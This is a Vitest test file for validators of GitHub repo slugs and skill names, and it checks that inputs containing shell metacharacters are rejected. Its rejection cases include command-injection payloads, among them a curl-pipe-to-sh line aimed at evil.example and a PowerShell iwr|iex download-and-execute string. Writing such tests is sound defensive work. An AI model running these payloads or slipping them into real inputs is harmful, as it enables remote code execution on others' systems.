import { describe, expect, it } from 'vitest';

import { isSafeRepoSlug, isSafeSkillName } from './safe-names';

describe('isSafeRepoSlug', () => {
  it.each(['octocat/hello-world', 'octocat/.github', 'acme-labs/my_repo.v2'])(
    'should accept the GitHub owner/repo slug %s',
    slug => {
      expect(isSafeRepoSlug(slug)).toBe(true);
    }
  );

  it.each([
    ['empty', ''],
    ['no repository part', 'acme'],
    ['an extra path segment', 'acme/a/b'],
    ['a dot repository', 'acme/.'],
    ['a dot-dot repository', 'acme/..'],
    ['a dot in the owner', 'ac.me/x'],
    ['an underscore in the owner', 'ac_me/x'],
    ['an empty owner', '/x'],
    ['an empty repository', 'acme/'],
    ['a space', 'acme/x y'],
    ['a semicolon', 'acme/x;id'],
    ['an ampersand', 'acme/x&id'],
    ['a pipe', 'acme/x|id'],
    ['a command substitution', 'acme/x$(id)'],
    ['a backtick', 'acme/x`id`'],
    ['a cmd variable', 'acme/x%PATH%'],
    ['a caret', 'acme/x^y'],
    ['a comma', 'acme/x,y'],
    ['a single quote', "acme/x'y"],
    ['a double quote', 'acme/x"y'],
    ['a newline', 'acme/x\nid'],
    ['a trailing newline', 'acme/x\n'],
    ['a leading space', ' acme/x'],
    ['a trailing space', 'acme/x '],
    [
      'a full injection payload',
      'acme/tools;curl -s https://evil.example/x|sh;#'
    ]
  ])('should refuse a slug with %s', (_label, slug) => {
    expect(isSafeRepoSlug(slug)).toBe(false);
  });
});

describe('isSafeSkillName', () => {
  it.each(['code-review', 'My_skill-2.v1', '2fa'])(
    'should accept the plain skill name %s',
    name => {
      expect(isSafeSkillName(name)).toBe(true);
    }
  );

  it.each([
    ['empty', ''],
    ['a leading dash', '-rf'],
    ['a leading dot', '.hidden'],
    ['only dots', '..'],
    ['a leading underscore', '_x'],
    ['a space', 'a b'],
    ['a slash', 'a/b'],
    ['a semicolon', 'a;b'],
    ['an ampersand', 'a&b'],
    ['a pipe', 'a|b'],
    ['a dollar sign', '$x'],
    ['a single quote', "a'b"],
    ['a double quote', 'a"b'],
    ['a backtick', 'a`b'],
    ['a percent sign', 'a%b'],
    ['a caret', 'a^b'],
    ['a comma', 'a,b'],
    ['a newline', 'a\nb'],
    ['a trailing newline', 'a\n'],
    ['a non-ASCII letter', 'café'],
    ['a PowerShell injection payload', "x'; iwr evil | iex; '"]
  ])('should refuse a skill name with %s', (_label, name) => {
    expect(isSafeSkillName(name)).toBe(false);
  });
});
